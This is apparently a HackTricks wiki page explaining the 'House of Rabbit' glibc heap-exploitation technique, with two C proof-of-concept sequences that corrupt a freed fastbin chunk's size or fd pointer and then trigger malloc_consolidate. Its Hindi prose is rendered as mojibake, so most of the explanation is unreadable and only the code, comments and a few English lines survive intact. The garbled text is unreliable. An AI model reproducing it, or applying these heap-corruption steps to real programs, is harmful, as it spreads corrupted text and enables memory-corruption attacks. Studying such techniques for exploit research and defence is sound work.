# House of Rabbit

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

### рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ

1. **рдлрд╛рд╕реНрдЯ рдмрд┐рди fd рдкреЙрдЗрдВрдЯрд░ рдпрд╛ рд╕рд╛рдЗрдЬрд╝ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдлрд╛рд╕реНрдЯрдмрд┐рди рдореЗрдВ рдПрдХ рдЪрдВрдХ рдХреЗ рдлреЙрд░рд╡рд░реНрдб рдкреЙрдЗрдВрдЯрд░ рдпрд╛ рдЙрд╕рдХрд╛ рд╕рд╛рдЗрдЬрд╝ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред
2. **`malloc_consolidate` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛**: рдЗрд╕реЗ рдмрдбрд╝реЗ рдЪрдВрдХ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдХреЗ рдпрд╛ рд╢реАрд░реНрд╖ рдЪрдВрдХ рдХреЛ рдорд░реНрдЬ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣реАрдк рдХреЛ рдЪрдВрдХ рдХреЛ рд╕рдореЗрдЯрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рд▓рдХреНрд╖реНрдп

1. **рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рдЪрдВрдХ рдмрдирд╛рдирд╛**: рдПрдХ рдЪрдВрдХ рдХреЛ рджреВрд╕рд░реЗ рдХреЗ рд╕рд╛рде рдУрд╡рд░рд▓реИрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рд╕реЗ рдФрд░ рд╣реАрдк рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
2. **рдлрд░реНрдЬреА рдЪрдВрдХ рдмрдирд╛рдирд╛**: рдПрдХ рдлрд░реНрдЬреА рдЪрдВрдХ рдХреЛ рдПрдХ рд╡реИрдз рдЪрдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрд▓реЛрдХреЗрдЯрд░ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдПред

## рд╣рдорд▓реЗ рдХреЗ рдЪрд░рдг

### POC 1: рдПрдХ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдЪрдВрдХ рдХрд╛ рд╕рд╛рдЗрдЬрд╝ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ

**рдЙрджреНрджреЗрд╢реНрдп**: рдПрдХ рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рдЪрдВрдХ рдмрдирд╛рдирд╛, рдПрдХ рдлрд╛рд╕реНрдЯрдмрд┐рди рдЪрдВрдХ рдХреЗ рд╕рд╛рдЗрдЬрд╝ рдХреЛ рдорд╛рдирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗред

* **рдЪрд░рдг 1: рдЪрдВрдХ рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **рдХрджрдо 2: рдЪрдВрдХреНрд╕ рдХреЛ рдореБрдХреНрдд рдХрд░реЗрдВ**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **рдЪрд░рдг 3: рдЪрдВрдХ рдХрд╛ рдЖрдХрд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **рдЪрд░рдг 4: `malloc_consolidate` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
рдПрдХ рдмрдбрд╝реЗ рдЪрдВрдХ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдиреЗ рд╕реЗ `malloc_consolidate` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдореЗрдВ рдЫреЛрдЯреЗ рдЪрдВрдХ рдХреЛ рдорд░реНрдЬ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред `chunk1` рдХрд╛ рдорд╛рдирд┐рдкреБрд▓реЗрдЯреЗрдб рд╕рд╛рдЗрдЬрд╝ `chunk2` рдХреЗ рд╕рд╛рде рдУрд╡рд░рд▓реИрдк рд╣реЛрдиреЗ рдХрд╛ рдХрд╛рд░рдг рдмрдирддрд╛ рд╣реИред

рдХрдВрд╕реЛрд▓рд┐рдбреЗрд╢рди рдХреЗ рдмрд╛рдж, `chunk1` `chunk2` рдХреЗ рд╕рд╛рде рдУрд╡рд░рд▓реИрдк рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЖрдЧреЗ рдХреА рдЙрддреНрдкреАрдбрд╝рди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

### POC 2: `fd` рдкреЙрдЗрдВрдЯрд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ

**рдЙрджреНрджреЗрд╢реНрдп**: рдлрд╛рд╕реНрдЯ рдмрд┐рди `fd` рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдорд╛рдирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗ рдПрдХ рдирдХрд▓реА рдЪрдВрдХ рдмрдирд╛рдПрдВред

* **рдЪрд░рдг 1: рдЪрдВрдХреНрд╕ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**рд╡реНрдпрд╛рдЦреНрдпрд╛**: рд╣рдо рджреЛ рдЪрдВрдХ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдПрдХ рдЫреЛрдЯрд╛ рдФрд░ рдПрдХ рдмрдбрд╝рд╛, рддрд╛рдХрд┐ рд╣реИрдк рдХреЛ рдлреЗрдХ рдЪрдВрдХ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

* **рдЪрд░рдг 2: рдлреЗрдХ рдЪрдВрдХ рдмрдирд╛рдПрдВ**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **рдХрджрдо 3: `chunk1` рдХреЛ рдореБрдХреНрдд рдХрд░реЗрдВ**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**рд╡реНрдпрд╛рдЦреНрдпрд╛**: рд╣рдо `chunk1` рдХреЛ рдореБрдХреНрдд рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ рддреНрд╡рд░рд┐рдд рдмрд┐рди рд╕реВрдЪреА рдореЗрдВ рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

* **рдЪрд░рдг 4: `chunk1` рдХреЗ `fd` рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**рд╡реНрдпрд╛рдЦреНрдпрд╛**: рд╣рдо `chunk1` рдХреЗ рдлреЙрд░рд╡рд░реНрдб рдкреЙрдЗрдВрдЯрд░ (`fd`) рдХреЛ рд╣рдорд╛рд░реЗ рдлреЗрдХ рдЪрдВрдХ рдХреА рдУрд░ рдкрд╣реБрдВрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рддреЗ рд╣реИрдВ рдЬреЛ `chunk2` рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред

* **рдЪрд░рдг 5: `malloc_consolidate` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Allocating a large chunk again triggers `malloc_consolidate`, which processes the fake chunk.

The fake chunk becomes part of the fastbin list, making it a legitimate chunk for further exploitation.

### рд╕рд╛рд░рд╛рдВрд╢

**House of Rabbit** рддрдХрдиреАрдХ рдореЗрдВ рдпрд╛ рддреЛ рдПрдХ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдЪрдВрдХ рдХрд╛ рдЖрдХрд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рдЪрдВрдХ рдмрдирд╛рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рдпрд╛ `fd` рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдорд╛рдирдХ рдЪрдВрдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдирд┐рдд рдЪрдВрдХ рдмрдирд╛рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИред рдпрд╣ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рд╣реАрдк рдореЗрдВ рдорд╛рдиреНрдп рдЪрдВрдХ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рд╢реЛрд╖рдг рд╕рдВрднрд╛рд╡рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдЗрди рдЪрд░рдгреЛрдВ рдХреЛ рд╕рдордЭрдирд╛ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░рдирд╛ рдЖрдкрдХреЗ рд╣реАрдк рд╢реЛрд╖рдг рдХреМрд╢рд▓ рдХреЛ рдмрдврд╝рд╛рдПрдЧрд╛ред

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
